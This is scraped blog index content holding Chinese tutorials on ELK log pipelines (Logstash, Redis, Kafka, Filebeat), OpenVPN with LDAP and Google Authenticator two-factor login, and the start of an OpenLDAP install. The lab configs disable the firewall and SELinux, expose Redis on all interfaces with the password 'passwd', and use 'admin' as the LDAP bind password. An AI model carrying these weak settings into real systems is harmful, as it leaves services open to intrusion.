{\u0026#34;pipeline.id\u0026#34;=\u0026gt;\u0026#34;main\u0026#34;} The stdin plugin is now waiting for input: 5.5.3 收集 Java 日志 5.5.3.1 准备配置文件 [root@elasticsearch-01 ~]# cat /etc/logstash/conf.d/java.conf input { file { path =\u0026gt; \u0026#34;/apps/elasticsearch/logs/elk-cluster.log\u0026#34; type =\u0026gt; \u0026#34;java-log\u0026#34; start_position =\u0026gt; \u0026#34;beginning\u0026#34; codec =\u0026gt; multiline { pattern =\u0026gt; \u0026#34;^\\[\u0026#34; negate =\u0026gt; true what =\u0026gt; \u0026#34;previous\u0026#34; } } } output { if [type] == \u0026#34;java-log\u0026#34; { elasticsearch { hosts =\u0026gt; [\u0026#34;10.0.0.11:9200\u0026#34;] index=\u0026gt;\u0026#34;%{type}-%{+YYYY.MM.dd}\u0026#34; } } } 5.5.3.2 生成 Java 日志文件 重启节点elasticsearch-02，使得集群产生多行错误日志以观察多行合并和的效果\n[root@elasticsearch-02 ~]# systemctl restart elasticsearch.service 生成的部分错误日志：\nless /apps/elasticsearch/logs/elk-cluster.log\n5.5.3.3 成功收集日志 5.5.3.4 通过 kibana 查看结果 添加索引模式 java-log* 后在 Discover 面板查看合并后的日志\n5.6 收集 Nginx 日志 nginx 的日志收集和 Java 类似，核心点在于将日志格式修改为 json 格式，这里仅演示如何修改日志格式。\n在 logstash 安装 nginx\n[root@logstash ~]# yum install -y nginx 修改 nginx 日志为 json 格式\n[root@logstash ~]# grep log_format -A 13 /etc/nginx/nginx.conf log_format main \u0026#39;{\u0026#34;@timestamp\u0026#34;:\u0026#34;$time_iso8601\u0026#34;,\u0026#39; \u0026#39;\u0026#34;host\u0026#34;:\u0026#34;$server_addr\u0026#34;,\u0026#39; \u0026#39;\u0026#34;clientip\u0026#34;:\u0026#34;$remote_addr\u0026#34;,\u0026#39; \u0026#39;\u0026#34;size\u0026#34;:$body_bytes_sent,\u0026#39; \u0026#39;\u0026#34;responsetime\u0026#34;:$request_time,\u0026#39; \u0026#39;\u0026#34;upstreamtime\u0026#34;:\u0026#34;$upstream_response_time\u0026#34;,\u0026#39; \u0026#39;\u0026#34;upstreamhost\u0026#34;:\u0026#34;$upstream_addr\u0026#34;,\u0026#39; \u0026#39;\u0026#34;http_host\u0026#34;:\u0026#34;$host\u0026#34;,\u0026#39; \u0026#39;\u0026#34;url\u0026#34;:\u0026#34;$uri\u0026#34;,\u0026#39; \u0026#39;\u0026#34;domain\u0026#34;:\u0026#34;$host\u0026#34;,\u0026#39; \u0026#39;\u0026#34;xff\u0026#34;:\u0026#34;$http_x_forwarded_for\u0026#34;,\u0026#39; \u0026#39;\u0026#34;referer\u0026#34;:\u0026#34;$http_referer\u0026#34;,\u0026#39; \u0026#39;\u0026#34;status\u0026#34;:\u0026#34;$status\u0026#34;}\u0026#39;; 重启 nginx 生成日志\n[root@logstash ~]# systemctl start nginx [root@logstash ~]# curl localhost [root@logstash ~]# tail /var/log/nginx/access.log {\u0026#34;@timestamp\u0026#34;:\u0026#34;2023-09-21T15:37:49+08:00\u0026#34;,\u0026#34;host\u0026#34;:\u0026#34;::1\u0026#34;,\u0026#34;clientip\u0026#34;:\u0026#34;::1\u0026#34;,\u0026#34;size\u0026#34;:4833,\u0026#34;responsetime\u0026#34;:0.000,\u0026#34;upstreamtime\u0026#34;:\u0026#34;-\u0026#34;,\u0026#34;upstreamhost\u0026#34;:\u0026#34;-\u0026#34;,\u0026#34;http_host\u0026#34;:\u0026#34;localhost\u0026#34;,\u0026#34;url\u0026#34;:\u0026#34;/index.html\u0026#34;,\u0026#34;domain\u0026#34;:\u0026#34;localhost\u0026#34;,\u0026#34;xff\u0026#34;:\u0026#34;-\u0026#34;,\u0026#34;referer\u0026#34;:\u0026#34;-\u0026#34;,\u0026#34;status\u0026#34;:\u0026#34;200\u0026#34;} 校验日志格式 JSON在线 | JSON解析格式化—SO JSON在线工具\n5.7 使用 Redis 缓存日志 目标：通过在 redis 客户端部署的 logstash （主机名 log-client） 收集日志，写入 redis （缓存作用），再通过专门的一台 logstash（主机名 logstash）读取 redis 中的日志写入 elasticsearch。\n5.7.1 准备一个客户端服务器 主机名 IP 系统 配置 log-client 10.0.0.9 CentOS 7.6 2U 4G # 关闭防火墙 systemctl disable firewalld --now # 关闭 NetworkManager systemctl disable NetworkManager --now # 关闭selinux setenforce 0 sed -i \u0026#39;/SELINUX/s/enforcing/disabled/\u0026#39; /etc/selinux/config # 修改文件句柄数的限制 echo \u0026#34;* soft nofile 65536\u0026#34; \u0026gt;\u0026gt; /etc/security/limits.conf echo \u0026#34;* hard nofile 65536\u0026#34; \u0026gt;\u0026gt; /etc/security/limits.conf 安装 redis\n[root@log-client ~]# yum install -y redis # 修改配置文件 [root@log-client ~]# cat /etc/redis.conf bind 0.0.0.0 protected-mode yes port 6379 tcp-backlog 511 timeout 0 tcp-keepalive 300 daemonize yes supervised no pidfile /var/run/redis_6379.pid loglevel notice databases 16 requirepass passwd [root@log-client ~]# systemctl start redis ## 安装 logstash [root@log-client ~]# # 导入证书 [root@log-client ~]# rpm --import https://artifacts.elastic.co/GPG-KEY-elasticsearch [root@log-client ~]# # 配置 yum 源 [root@log-client ~]# cat \u0026gt; /etc/yum.repos.d/logstash-7.repo \u0026lt;\u0026lt; EOF \u0026gt; [logstash-7.x] \u0026gt; name=Elastic repository for 7.x packages \u0026gt; baseurl=https://artifacts.elastic.co/packages/7.x/yum \u0026gt; gpgcheck=1 \u0026gt; gpgkey=https://artifacts.elastic.co/GPG-KEY-elasticsearch \u0026gt; enabled=1 \u0026gt; autorefresh=1 \u0026gt; type=rpm-md \u0026gt; EOF [root@log-client ~]# yum install -y logstash 5.7.2 收集日志写入 redis [root@log-client ~]# cat /etc/logstash/conf.d/sys-to-redis.conf input { file { path =\u0026gt; \u0026#34;/var/log/message\u0026#34; type =\u0026gt; \u0026#34;system-log\u0026#34; start_position =\u0026gt; \u0026#34;beginning\u0026#34; stat_interval =\u0026gt; \u0026#34;2\u0026#34; } } output { if [type] == \u0026#34;system-log\u0026#34; { redis { data_type =\u0026gt; \u0026#34;list\u0026#34; key =\u0026gt; \u0026#34;system-log\u0026#34; host =\u0026gt; \u0026#34;10.0.0.9\u0026#34; port =\u0026gt; \u0026#34;6379\u0026#34; db =\u0026gt; \u0026#34;0\u0026#34; password =\u0026gt; \u0026#34;passwd\u0026#34; } } } root@log-client ~]# chmod +r /var/log/messages [root@log-client ~]# ll /var/log/messages -rw-r--r--. 1 root root 596944 Sep 22 11:39 /var/log/messages [root@log-client ~]# systemctl start logstash.service # 成功写入日志 [root@log-client ~]# telnet localhost 6379 ... Escape character is \u0026#39;^]\u0026#39;. auth passwd +OK select 0 +OK keys * *1 $10 system-log # 以list 方式存储 LRANGE system-log 0 0 #查看其中一条消息 *1 $139 {\u0026#34;path\u0026#34;:\u0026#34;/var/log/messages\u0026#34;,\u0026#34;host\u0026#34;:\u0026#34;log-client\u0026#34;,\u0026#34;@timestamp\u0026#34;:\u0026#34;2023-09-22T03:52:48.547Z\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;system-log\u0026#34;,\u0026#34;@version\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;tet\u0026#34;} 5.7.3 读取 redis 的日志写入 elasticsearch 准备配置文件：\n[root@logstash ~]# cat /etc/logstash/conf.d/redis-to-es.conf input { redis { data_type =\u0026gt; \u0026#34;list\u0026#34; key =\u0026gt; \u0026#34;system-log\u0026#34; host =\u0026gt; \u0026#34;10.0.0.9\u0026#34; port =\u0026gt; \u0026#34;6379\u0026#34; db =\u0026gt; \u0026#34;0\u0026#34; password =\u0026gt; \u0026#34;passwd\u0026#34; } } output { if [type] == \u0026#34;system-log\u0026#34; { elasticsearch { hosts =\u0026gt; [\u0026#34;10.0.0.11:9200\u0026#34;] index =\u0026gt; \u0026#34;redis-to-es-%{+YYYY.MM.dd}\u0026#34; } } } # 重启logstash [root@logstash ~]# systemctl restart logstash 验证结果：\nelasticseach 成功获取到日志信息\nredis 中的消息被消费：\n5.8 使用 Kafka 缓存日志 5.8.1 在 log-clinet 部署 kafka Kafka简介与集群部署 | WZ\u0026rsquo;s Blog (senmer.github.io)\n5.8.2 将日志写入 Kafka [root@log-client ~]# cat /etc/logstash/conf.d/sys-to-kafka.conf input { file { path =\u0026gt; \u0026#34;/var/log/messages\u0026#34; type =\u0026gt; \u0026#34;system-log\u0026#34; start_position =\u0026gt; \u0026#34;beginning\u0026#34; stat_interval =\u0026gt; \u0026#34;2\u0026#34; } } output { if [type] == \u0026#34;system-log\u0026#34; { kafka { bootstrap_servers =\u0026gt; \u0026#34;10.0.0.11:9092\u0026#34; topic_id =\u0026gt; \u0026#34;system-log\u0026#34; } } } # 配置域名解析，kafka 连接 elasticsearch 需要用到 [root@log-client ~]# cat /etc/hosts 127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4 ::1 localhost localhost.localdomain localhost6 localhost6.localdomain6 10.0.0.11 elasticsearch-01 10.0.0.12 elasticsearch-02 10.0.0.13 elasticsearch-03 # 重启 logstash [root@log-client ~]# systemctl restart logstash 5.8.3 查看 Kafka 中的 topic 注意：本示例中 Kafka、zookeeper、elasticsearch 集群均安装在（10.0.0.11、10.0.0.12、10.0.0.13）三台主机上\n[root@elasticsearch-01 kafka]# pwd /usr/local/kafka [root@elasticsearch-01 kafka]# ./bin/kafka-topics.sh --list --zookeeper localhost:2181 OpenJDK 64-Bit Server VM warning: If the number of processors is expected to increase from one, then you should configure the number of parallel GC threads appropriately using -XX:ParallelGCThreads=N __consumer_offsets system-log # 成功写入日志 5.8.4 读取 Kafka 中的日志写入 Elasticsearch [root@logstash ~]# cat /etc/logstash/conf.d/kafka-to-es.conf input { kafka { bootstrap_servers =\u0026gt; \u0026#34;10.0.0.11:9092\u0026#34; topics =\u0026gt; \u0026#34;system-log\u0026#34; consumer_threads =\u0026gt; 1 } } output { elasticsearch { hosts =\u0026gt; [\u0026#34;10.0.0.11:9200\u0026#34;] index =\u0026gt; \u0026#34;kafka-to-es-%{+YYYY.MM.dd}\u0026#34; } } [root@logstash ~]# systemctl restart logstash.service 5.9 使用 filebeat 收集日志 要在 Filebeat 中使用 conf.d/* 的方式导入配置文件，通常你需要按照以下步骤进行配置：\n创建一个存放额外配置文件的目录，通常命名为 conf.d，并将你的额外配置文件放置在该目录中。这些配置文件可以包含不同输入、过滤器和输出的定义。\n确保 Filebeat 配置文件中包含一个配置项，告诉 Filebeat 去加载 conf.d 目录下的配置文件。通常，你可以使用 filebeat.config.modules 来配置额外配置文件的路径，如下所示：\nfilebeat.config.modules: path: ${path.config}/modules.d/*.yml reload.enabled: false filebeat.config.inputs: enabled: true path: ${path.config}/conf.d/*.yml # 这里指定额外配置文件的路径 确保你的额外配置文件（位于 conf.d 目录中）具有正确的格式和语法。这些配置文件可以包含输入、过滤器和输出的定义，类似于主配置文件。 以下是一个示例额外配置文件的内容（conf.d/my-custom-input.yml）：\nfilebeat.inputs: - type: log paths: - /var/log/myapp/*.log fields: log_type: myapp-log 保存主配置文件和额外配置文件，并重新启动 Filebeat 服务以使更改生效： sudo systemctl restart filebeat 这样，Filebeat 将加载主配置文件以及位于 conf.d 目录下的所有额外配置文件，并根据这些配置文件来处理日志数据。\n请根据你的实际需求和环境对配置进行自定义，并确保配置文件的正确性和一致性。\nhttps://www.elastic.co/guide/en/beats/filebeat/7.17/setup-repositories.html#_yum\n5.9.1 在 log-client 安装 filebeat [root@log-client ~]# sudo rpm --import https://packages.elastic.co/GPG-KEY-elasticsearch [root@log-client ~]# [root@log-client ~]# cat \u0026gt; /etc/yum.repos.d/filebeat-7.repo \u0026lt;\u0026lt; EOF \u0026gt; [elastic-7.x] \u0026gt; name=Elastic repository for 7.x packages \u0026gt; baseurl=https://artifacts.elastic.co/packages/7.x/yum \u0026gt; gpgcheck=1 \u0026gt; gpgkey=https://artifacts.elastic.co/GPG-KEY-elasticsearch \u0026gt; enabled=1 \u0026gt; autorefresh=1 \u0026gt; type=rpm-md \u0026gt; EOF [root@log-client ~]# sudo yum install filebeat 5.9.2 收集系统日志 5.9.2.1 收集单个系统日志，写入 kafka [root@log-client ~]# cat /etc/filebeat/filebeat.yml lebeat.config.modules: path: ${path.config}/modules.d/*.yml reload.enabled: true filebeat.inputs: - type: log enabled: true paths: - /var/log/*.log - /var/log/messages exclude_lines: [\u0026#34;^DBG\u0026#34;] exclude_files: [\u0026#34;.gz$\u0026#34;] fields_under_root: true fields: document_type: \u0026#34;system-log\u0026#34; output.kafka: hosts: [\u0026#34;10.0.0.11:9092\u0026#34;, \u0026#34;10.0.0.12:9092\u0026#34;, \u0026#34;10.0.0.13:9092\u0026#34;] topic: \u0026#34;system-log-filebeat\u0026#34; partition.round_robin: reachable_only: true required_acks: 1 compression: gzip max_message_bytes: 1000000 [root@log-client ~]# systemctl restart filebeat 2.9.2.2 在 kafka 中查看 topic [root@elasticsearch-01 elasticsearch]# /usr/local/src/kafka_2.12-2.1.0/bin/kafka-topics.sh --list --zookeeper localhost:2181 |grep filebeat ... system-log-filebeat 2.9.2.3 使用 logstash 将 kafka 中的日志写入 elasticsearch [root@logstash ~]# cat /etc/logstash/conf.d/kafka-to-es.conf input { kafka { bootstrap_servers =\u0026gt; \u0026#34;10.0.0.11:9092\u0026#34; topics =\u0026gt; \u0026#34;system-log-filebeat\u0026#34; consumer_threads =\u0026gt; 1 } } output { elasticsearch { hosts =\u0026gt; [\u0026#34;10.0.0.11:9200\u0026#34;] index =\u0026gt; \u0026#34;syslog-filebeat-%{+YYYY.MM.dd}\u0026#34; } } [root@logstash ~]# systemctl restart logstash FAQ elk 中用 redis 和用 kafka 缓存日志有何区别 在ELK（Elasticsearch, Logstash, Kibana）堆栈中，使用Redis和Kafka来缓存日志有一些区别，它们分别适用于不同的使用情境和需求：\nRedis缓存日志：\nRedis是一个内存数据库，通常用于缓存和高速读写操作。在ELK中，Redis通常用于缓存日志事件，以便在Logstash和Elasticsearch之间提供快速的缓冲机制。 使用Redis缓存日志的优点包括高速的写入和读取速度，以及简单的设置和配置。 缺点是Redis的存储容量受限于内存大小，可能需要更多的内存来缓存大量的日志事件。此外，Redis不是一个专门设计用于处理日志流的工具，因此在某些情况下可能需要额外的定制。 Kafka缓存日志：\nKafka是一个分布式消息队列，通常用于高吞吐量的数据流处理。在ELK中，Kafka用于接收、缓存和分发日志事件，充当了一个持久性的数据缓冲层。 使用Kafka的优点包括能够处理大规模的数据流，提供数据持久性，以及具备高可用性和可伸缩性。 缺点是Kafka的配置和维护可能相对复杂，因为它是一个分布式系统。此外，它不像Redis那样适用于低延迟要求的场景。 关键区别：\nRedis主要用于瞬时性缓存，适用于需要快速读写操作的场景，但不适用于长期存储。它通常用于解决Logstash和Elasticsearch之间的速度不匹配问题。 Kafka更适合于数据流处理，能够缓存大量数据并确保持久性。它允许多个消费者并行处理数据，因此适用于大规模、高吞吐量的日志处理。 通常情况下，选择使用Redis还是Kafka取决于你的日志处理需求和架构。如果你需要一个简单的缓冲层来解决速度不匹配的问题，Redis可能是更合适的选择。如果你需要处理大量的日志数据，需要持久性和分布式处理能力，那么Kafka可能更适合。此外，还可以考虑将它们结合使用，使用Redis进行短期缓存，然后将日志事件写入Kafka以进行长期存储和分发。\nfilebeat 和 logstash 的区别 Filebeat和Logstash都是用于日志收集和传输的工具，但它们有一些关键区别，主要涉及到它们的用途、特性和性能：\n用途：\nFilebeat：Filebeat是轻量级的数据收集器，专注于从文件和日志位置收集数据并将其发送到目标位置，通常是Elasticsearch或Logstash。它主要用于日志文件的收集和转发。 Logstash：Logstash是一个强大的数据处理引擎，具有数据转换、过滤和丰富功能。它可以用于数据的采集、转换、丰富、过滤和输出。虽然它也可以用于日志收集，但其功能更丰富，可以处理多种数据源和格式。 处理和转换：\nFilebeat：Filebeat通常不对数据进行处理或转换，它负责将原始数据发送到目标位置。它可以对数据进行简单的筛选，但不具备复杂的数据处理功能。 Logstash：Logstash具有强大的数据处理能力，可以对数据进行复杂的转换、过滤、丰富和标准化操作。这使得Logstash在需要对数据进行复杂处理的情况下非常有用。 插件和输出：\nFilebeat：Filebeat的主要目标是将数据发送到Elasticsearch、Logstash或其他目标。它的输出选项相对较少，主要用于数据的传输。 Logstash：Logstash有丰富的插件和输出选项，可以将数据发送到多种目标，包括Elasticsearch、Kafka、Redis、数据库等，同时可以使用各种输入插件来接收数据源。 轻量性和性能：\nFilebeat：Filebeat设计为轻量级，占用较少的系统资源，适用于部署在资源受限的环境中。它适合快速传输日志数据。 Logstash：Logstash相对较重，需要更多的系统资源，特别是在进行大规模数据处理时。它适合处理复杂的数据处理任务。 部署场景：\nFilebeat适用于简单的日志传输和快速的日志收集场景，特别是在需要轻量级解决方案的情况下。 Logstash适用于需要进行数据处理、转换和丰富操作的场景，尤其是当需要处理多种数据源或数据格式时。 通常情况下，你可以根据具体的需求来选择使用Filebeat、Logstash，或者它们的组合，以构建适合你的日志收集和处理架构。要根据特定需求进行选择，以确保系统的效率和性能。\n","permalink":"https://senmer.github.io/zh/posts/tech/elk/elk%E9%83%A8%E7%BD%B2%E5%92%8C%E4%BD%BF%E7%94%A8/","summary":"一、ELK 简介 ELK是一个流行的开源日志管理和分析平台，它由三个核心组件组成：Elasticsearch、Logstash和Kibana。这三个组件协同工作，使用户能够收集、存储、搜索、分析和可视化大量日志数据。ELK被广泛用于实时日志分析、应用性能监控、安全事件检测等领域。 下面","title":"ELK部署和使用"},{"content":"一、概述 本节内容开始之前，已经部署好了openVPN以及LDAP认证。\n企业环境中，LDAP用户名密码可以说是一号走天下，一旦出现用户名密码泄露(粗心程序员传到github)，那损失是巨大的，因此加上双因子认证，也是加上了一层保险。这里我们的双因子认证是通过GoogleAuthenticator实现的，因为他的原理比较简单，在业内也很通用。\n二、安装 要实现LDAP+GoogleAuthenticator认证，openvpn需要安装两个插件\nhttps://github.com/threerings/openvpn-auth-ldap\nhttps://github.com/evgeny-gridasov/openvpn-otp\n第一个实现LDAP登陆，第二个实现OTP。由于两个插件先后顺序需要兼容，必须使用最新版本。\n#@安装LDAP插件 git clone https://github.com/threerings/openvpn-auth-ldap cd openvpn-auth-ldap #@安装依赖 yum install re2c libtool openldap openldap-devel openvpn openvpn-devel gcc-objc openssl openssl-devel -y #@下载安装包解压，开始编译 ./regen.sh ./configure --with-openldap=/usr/ --with-openvpn=/usr/ CFLAGS=\u0026#34;-fPIC\u0026#34; OBJCFLAGS=\u0026#34;-std=gnu11\u0026#34; make make install #@安装OTP插件 git clone https://github.com/evgeny-gridasov/openvpn-otp cd openvpn-otp yum install autoconf automake libtool* -y ./autogen.sh ./configure make make install 安装完成后可以找到这两个插件。(.so模块可以任意拷贝到其他目录使用的)\n/usr/local/lib/openvpn-auth-ldap.so /usr/local/lib/openvpn/openvpn-otp.so 三、服务器端配置 有了插件以后我们就可以修改服务器端配置了，主要用到了三个配置文件：\nopenVPN 的主配置文件 server.conf openvpn-auth-ldap 插件的配置文件 ldap.conf openvpn-otp 插件的配置文件 otp-secrets 3.1 openVPN 接入插件模块 先看下openvpn的主配置文件 server.conf，其指定了两个插件模块以及配置文件的路径\n注意：使用以下配置时，需删除注释内容。\nport 13588 proto tcp dev tun ca /etc/openvpn/certs/ca.crt cert /etc/openvpn/certs/server.crt key /etc/openvpn/certs/server.key # This file should be kept secret dh /etc/openvpn/certs/dh.pem server 10.8.0.0 255.255.255.0 push \u0026#34;route 10.0.16.0 255.255.255.0\u0026#34; keepalive 10 120 cipher AES-256-CBC compress lz4-v2 push \u0026#34;compress lz4-v2\u0026#34; max-clients 2048 user openvpn group openvpn status /var/log/openvpn/openvpn-status.log log-append /var/log/openvpn/openvpn.log verb 3 mute 20 client-cert-not-required #@启用ldap模块 plugin \u0026#34;/usr/local/lib/openvpn-auth-ldap.so\u0026#34; \u0026#34;/etc/openvpn/auth/ldap.conf\u0026#34; #@启用otp模块 plugin /usr/local/lib/openvpn/openvpn-otp.so \u0026#34;password_is_cr=1 otp_secrets=/etc/openvpn/auth/otp-secrets\u0026#34; #@reneg-sec服务器端会定期检查认证情况，默认3600秒一小时，使用OTP的话尽量时间长一些，否则客户端需要重新输入用户名密码和OTP一次性密码。0表示不重新认证（服务端和客户端同时配置才可生效，若两端不一致，则以时长短的一个为准） reneg-sec 0 3.2 接入 openLDAP 服务 注意：这里需要使用 groupOfUniqueNames 类型的组才支持组过滤\n配置 /etc/openvpn/auth/ldap.conf，接入ldap服务（已提前安装LDAP服务）\n\u0026lt;LDAP\u0026gt; URL ldap://127.0.0.1:389 BindDN cn=admin,dc=ldap,dc=com Password\tadmin Timeout 15 TLSEnable no FollowReferrals yes \u0026lt;/LDAP\u0026gt; \u0026lt;Authorization\u0026gt; BaseDN \u0026#34;ou=users,dc=ldap,dc=com\u0026#34; SearchFilter \u0026#34;uid=%u\u0026#34; #启用组过滤功能，限制VPN组中的账号才能登录 RequireGroup true \u0026lt;Group\u0026gt; BaseDN \u0026#34;ou=groups,dc=ldap,dc=com\u0026#34; SearchFilter \u0026#34;cn=vpn\u0026#34; MemberAttribute uniqueMember \u0026lt;/Group\u0026gt; PasswordIsCR true #@此选项必须加上以支持otp验证码功能 \u0026lt;/Authorization\u0026gt; 3.2 接入 OTP 服务 配置 /etc/openvpn/auth/otp-secrets，接入otp服务。\n此处实现了两个脚本，可以根据 openLDAP 服务中的用户生成对应的 secrets配置：\n确保已提前安装 google-authenticator\nyum install -y google-authenticator 3.2.1 添加用户 用法：bash create_google_auth.sh \u0026lt;用户名\u0026gt;\n# cat create_google_auth.sh #!/bin/bash USER=$1 GOOGLE_FILE_PATH=\u0026#34;/opt/google_auth/\u0026#34; #密钥存放路径 OTP_SECRETS=\u0026#34;/etc/openvpn/auth/otp-secrets\u0026#34; [ -f $GOOGLE_FILE_PATH ] \u0026amp;\u0026amp; mkdir -p $GOOGLE_FIEL_PATH while [ -z $USER ] ; do read -p \u0026#34;未提供用户名，请重新输入。按[q]退出: \u0026#34; USER done [ $USER == \u0026#39;q\u0026#39; ] \u0026amp;\u0026amp; exit 1 grep $USER $OTP_SECRETS \u0026amp;\u0026gt; /dev/null if [ $? -eq 0 ]; then #while [ -z $CON ] ; do read -p \u0026#34;用户已存在，是否重新生成? [y]继续 [任意键]退出 : \u0026#34; CON #done [ ${CON}end == \u0026#39;y\u0026#39;end ] \u0026amp;\u0026amp; sed -ri \u0026#34;/$USER/d\u0026#34; ${OTP_SECRETS} || exit 1 fi google-authenticator --time-based --force --disallow-reuse --rate-limit=3 --rate-time=30 --window-size=3 --issuer=kuaidi100 --label=${USER} --secret=${GOOGLE_FILE_PATH}${USER} [ $? -eq 0 ] \u0026amp;\u0026amp; echo \u0026#34;用户认证文件已保存至: ${GOOGLE_FILE_PATH}${USER}\u0026#34; # \u0026amp;\u0026amp; echo \u0026#34;二维码见此URL: $(grep http ${GOOGLE_FILE_PATH}${USER})\u0026#34; #SECRET_KEY=$(cat ${GOOGLE_FILE_PATH}${USER} | grep \u0026#34;secret key\u0026#34; | awk \u0026#39;{print $NF}\u0026#39;) SECRET_KEY=$(sed -n \u0026#39;1p\u0026#39; ${GOOGLE_FILE_PATH}${USER}) echo \u0026#34;$USER otp totp:sha1:base32:${SECRET_KEY}::xxx *\u0026#34; \u0026gt;\u0026gt; ${OTP_SECRETS} 3.2.3 删除用户 用法：bash delete_google_auth.sh \u0026lt;用户名\u0026gt;\n# cat delete_google_auth.sh #!/bin/bash USER=$1 GOOGLE_FILE_PATH=\u0026#34;/opt/google_auth/\u0026#34; #密钥存放路径 OTP_SECRETS=\u0026#34;/etc/openvpn/auth/otp-secrets\u0026#34; while [ -z $USER ] ; do read -p \u0026#34;未提供用户名，请重新输入。按[q]退出: \u0026#34; USER done [ $USER == \u0026#39;q\u0026#39; ] \u0026amp;\u0026amp; exit 1 [ -f ${GOOGLE_FILE_PATH}${USER} ] \u0026amp;\u0026amp; rm -f ${GOOGLE_FILE_PATH}${USER} sed -ri \u0026#34;/$USER/d\u0026#34; ${OTP_SECRETS} echo \u0026#34;$USER 用户已删除！\u0026#34; [root@VM-16-2-centos openvpn]# less /root/create_google_auth.sh [root@VM-16-2-centos openvpn]# cat /root/delete_google_auth.sh #!/bin/bash USER=$1 GOOGLE_FILE_PATH=\u0026#34;/opt/google_auth/\u0026#34; OTP_SECRETS=\u0026#34;/etc/openvpn/auth/otp-secrets\u0026#34; while [ -z $USER ] ; do read -p \u0026#34;未提供用户名，请重新输入。按[q]退出: \u0026#34; USER done [ $USER == \u0026#39;q\u0026#39; ] \u0026amp;\u0026amp; exit 1 [ -f ${GOOGLE_FILE_PATH}${USER} ] \u0026amp;\u0026amp; rm -f ${GOOGLE_FILE_PATH}${USER} sed -ri \u0026#34;/$USER/d\u0026#34; ${OTP_SECRETS} echo \u0026#34;$USER 用户已删除！\u0026#34; 生成的otp-secrets文件内容（参考）：\ntest otp totp:sha1:base32:X5IZ6G3YB6ETX6CDOZHAM66AYU::xxx * 四、OpenVPN客户端配置 client remote 101.43.252.204 13588 proto tcp dev tun resolv-retry infinite nobind persist-key persist-tun ns-cert-type server ca ca.crt #cert test.crt #key test.key remote-cert-tls server auth-user-pass\t#启用账号认证功能 auth-nocache static-challenge \u0026#34;Enter Google Authenticator Token\u0026#34; 1 #弹出验证框，1表示明文显示，0表示密文显示 redirect-gateway def1 comp-lzo verb 3 reneg-sec 0 #禁用定时认证 五、参考链接： https://github.com/threerings/openvpn-auth-ldap https://github.com/evgeny-gridasov/openvpn-otp\nhttps://www.ipcpu.com/2019/04/openvpn-googleauthenticator/\n","permalink":"https://senmer.github.io/zh/posts/tech/vpn/openvpn%E5%90%AF%E7%94%A8ldap+googleauthenticator%E8%AE%A4%E8%AF%81/","summary":"一、概述 本节内容开始之前，已经部署好了openVPN以及LDAP认证。 企业环境中，LDAP用户名密码可以说是一号走天下，一旦出现用户名密码泄露(粗心程序员传到github)，那损失是巨大的，因此加上双因子认证，也是加上了一层保险。这里我们的双因子认证是通过GoogleAuthen","title":"OpenVPN启用LDAP+GoogleAuthenticator认证"},{"content":"一、OpenLDAP简介 LDAP是一款轻量级目录访问协议（Lightweight Directory Access Protocol，简称LDAP），属于开源集中账号管理架构的实现，且支持众多系统版本，被广大互联网公司所采用。\nLDAP提供并实现目录服务的信息服务，目录服务是一种特殊的数据库系统，对于数据的读取、浏览、搜索有很好的效果。目录服务一般用来包含基于属性的描述性信息并支持精细复杂的过滤功能，但OpenLDAP目录服务不支持通用数据库的大量更新操作所需要的复杂的事务管理或回滚策略等。\nLDAP具有两个标准，分别是X.500和LDAP。OpenLDAP是基于X.500标准的，而且去除了X.500复杂的功能并且可以根据自我需求定制额外扩展功能，但与X.500也有不同之处，例如OpenLDAP支持TCP/IP协议等，目前TCP/IP是Internet上访问互联网的协议。\nOpenLDAP默认以Berkeley DB作为后端数据库（高版本变更为MDB，从2.4.44开始支持），BerkeleyDB数据库主要以散列的数据类型进行数据存储，如以键值对的方式进行存储。\nBerkeleyDB是一类特殊的面向查询进行优化、面向读取进行优化的数据库，主要用于搜索、浏览、更新查询操作，一般对于一次写入数据、多次查询和搜索有很好的效果。BerkeleyDB不支持事务型数据库(MySQL、MariDB、Oracle等)所支持的高并发的吞吐量以及复杂的事务操作。\n二、yum安装OpenLDAP 在两台机器均安装 openldap\n2.1 初始化环境 主机名 IP 系统 配置 openldap 10.0.0.2 CentOS - 7.9.2009 1U 2G 相关软件包:\n安装包名称 说明 openldap openldap服务端和客户端必须用的库文件。 openldap-servers 用于启动服务和设置. 包含单独的ldap后台守护程序。 openldap-clients 用于启动服务和设置. 包含单独的ldap后台守护程序。 openldap-devel devel包，可选择进行安装。 openldap-servers-sql 支持sql模块，可进行选择性安装。 migrationtools 通过migrationtools实现OpenLDAP用户及用户组的添加，导入系统账户，可进行选择性安装。 compat-openldap openldap兼容性库 其中compat-openldap这个包与主从有很大的关系 关闭selinux\nsed -i \u0026#39;/ELINUX/s/enforcing/disabled/\u0026#39; /etc/selinux/config setenforce 0 关闭防火墙\nsystemctl disable --now firewalld.service 2.2 yum安装OpenLDAP 查看可安装版本\nyum list openldap --show-duplicates 安装openldap指定版本及相关依赖****\nopenldap_version=2.4.44-25.el7_9 yum install -y \\ openldap-${openldap_version} \\ openldap-clients-${openldap_version} \\ openldap-servers-${openldap_version} \\ openldap-devel-${openldap_version} \\ compat-openldap 准备数据库配置文件\ncp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIG 修改数据目录权限给ldap用户，此用户在安装时已自动创建\nchown -R ldap:ldap /var/lib/ldap/DB_CONFIG 查看openldap版本\nslapd -VV 启动ldap server服务，先启动服务，后面进行配置更改\nsystemctl enable slapd --now 查看服务状态\nsystemctl status slapd 三、配置OpenLDAP 从openldap2.4.23版本开始，所有配置都保存在/etc/openldap/slapd.d目录下的cn=config文件夹内，不再使用slapd.conf作为配置文件。配置文件的后缀为ldif，且每个配置文件都是通过命令自动生成的，任意打开一个配置文件，在开头都会有一行注释，说明此为自动生成的文件，请勿编译，使用ldapmodify命令进行修改。\n安装openldap后，会有三个命令用于修改配置文件，分别为ldapadd，ldapmodify，ldapdelete，顾名思义就是添加，修改和删除。而需要修改或增加配置时，则需要先写一个ldif后缀的配置文件，然后通过命令将写的配置更新到slapd.d目录下的配置文件中去，完整的配置过程如下：\n3.1 导入基本schema 注意：导入顺序有要求，如果顺序不对会报错\n我们需要向ldap中导入一些基本的schema。这些schema文件位于/etc/openldap/schema/目录中，schema控制着条目拥有哪些对象类和属性，可以自行选择需要的进行导入，依次执行下面的命令，导入基础的一些配置，我这里将所有的都导入一下，其中core.ldif是默认已经加载了的，不用导入。\nldapadd -Y EXTERNAL 